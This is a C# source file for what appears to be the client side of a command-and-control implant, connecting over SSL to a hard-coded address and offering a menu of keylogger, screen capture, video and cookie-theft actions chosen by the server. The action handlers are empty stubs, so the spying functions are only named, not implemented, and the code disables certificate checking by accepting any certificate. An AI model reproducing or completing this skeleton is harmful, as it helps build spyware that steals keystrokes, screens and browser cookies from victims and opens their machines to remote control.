using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace pm3candc
{
    class Program
    {
        // "Server SSL Certyficate (CN=www.domain.com)"
        public static string hostname = "capss";

        // "Server host localhost"
        public static string host = "192.168.58.128";

        // "Server port"
        public static int port = 9999;

        public static string txt = "";
        static void Main(string[] args)
        {
            String menu = " Menu\n";
            menu += "1.- Keylogger\n";
            menu += "2.- Captura de pantalla\n";
            menu += "3.- Video\n";
            menu += "4.- cookies\n";
            menu += "5.- \n";
            ConnectSSL(menu);
        }
        static string ReadMessage(SslStream sslStream)
        {
            // Read the  message sent by the server. The end of the message is signaled using the "<END>" marker.
            byte[] buffer = new byte[2048];
            StringBuilder messageData = new StringBuilder();
            int bytes = -1;
            do
            {
                bytes = sslStream.Read(buffer, 0, buffer.Length);

                // Use Decoder class to convert from bytes to UTF8 
                // in case a character spans two buffers.
                Decoder decoder = Encoding.UTF8.GetDecoder();
                char[] chars = new char[decoder.GetCharCount(buffer, 0, bytes)];
                decoder.GetChars(buffer, 0, bytes, chars, 0);
                messageData.Append(chars);
                // Check for EOF. 
                if (messageData.ToString().IndexOf("\n") != -1)
                {
                    break;
                }
            } while (bytes != 0);

            return messageData.ToString();
        }
        public static void ConnectSSL(string msg = "")
        {

            txt = "";
            try
            {
                TcpClient client = new TcpClient(host, port);

                // Create an SSL stream that will close the client's stream.
                SslStream sslStream = new SslStream(client.GetStream(), false,
                    new RemoteCertificateValidationCallback(ValidateServerCertificate),
                    null
                );
                try
                {
                    sslStream.AuthenticateAsClient(hostname);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                    client.Close();
                    return;
                }


                // Signal the end of the message using the "<END>".
                // Semd message

                while (true)
                {
                    byte[] messsage = System.Text.Encoding.ASCII.GetBytes(msg + "\n");
                    // Send hello message to the server. 
                    sslStream.Write(messsage);
                    sslStream.Flush();
                    // Read message from the server. 
                    string serverMessage = ReadMessage(sslStream);
                    string time = DateTime.UtcNow.ToString();
                    Console.WriteLine(time + " Server says: " + serverMessage);
                    int opcion = Int32.Parse(serverMessage);
                    if (opcion > 0 && opcion<6) {
                        if (opcion == 1)
                        {
                            // Keylogger
                        }else if (opcion == 2)
                        {
                            // Captura de pantalla
                        }else if(opcion == 3)
                        {
                            // Video
                        }else if(opcion == 4)
                        {
                            // Cookies
                        }else if(opcion == 5)
                        {
                            // 
                        }
                    }


                    // Close the client connection.
                }


                client.Close();

                Console.WriteLine("Client closed.");
                Console.Read();
            }
            catch (ArgumentNullException e)
            {
                Console.WriteLine("ArgumentNullException: {0}", e);
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }

        }
        // The following method is invoked by the RemoteCertificateValidationDelegate.
        public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            if (sslPolicyErrors == SslPolicyErrors.None)
                return true;

            // Console.WriteLine("Certificate error: {0}", sslPolicyErrors);

            // Do not allow this client to communicate with unauthenticated servers.
            //return false;
            //Force ssl certyfikates as correct
            return true;
        }
    }
   
}
